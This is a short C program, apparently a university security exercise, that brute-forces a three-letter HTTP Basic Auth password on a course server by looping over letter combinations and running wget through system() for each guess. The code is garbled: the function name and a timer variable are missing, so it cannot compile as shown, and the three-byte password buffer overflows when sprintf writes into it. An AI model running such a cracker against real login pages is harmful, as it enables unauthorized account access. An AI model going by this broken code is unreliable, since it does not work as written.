



#include <stdio.h>
#include <stdlib.h>
#include  <time.h>

int ()  
{
  int i,j,k,cntr=0;
  char  pass[3];
  char password[3];
  char get[96];
  char username[]="";
  int R_VALUE;
  double time_used;
  
  clock_t ,end; 
  
   =clock(); 
  
  
  
  for (i = 65; i <= 122; i++)
  {
    if(i==91) {i=97;}
   
       for (j = 65; j <= 122; j++)
	   {
         if(j==91) {j=97;}
      
           for (k = 65; k <= 122; k++)
		   {
            if(k==91) {k=97;}  
         
             pass[0] = i;
             pass[1] = j;
	         pass[2] = k;
             sprintf(password,"%c%c%c",pass[0],pass[1],pass[2]);       
             cntr++;
	         
			 printf("%d )%s\n\n", cntr, password);
             sprintf(get,"wget --non-verbose --http-user=%s --http-passwd=%s http://sec-crack.cs.rmit.edu./SEC/2/",username,password);
             

	         R_VALUE=system(get);
	  
	          if(R_VALUE==0) 
			  {
		        printf("The Password has been cracked and it is : %s" , password);
		        exit(0);
			  }
		   }
     
	   }
  
  }
  
  end = clock();

time_used = ((double) (end - )) / CLOCKS_PER_SEC;

printf("time_used = %f\n", time_used);
}

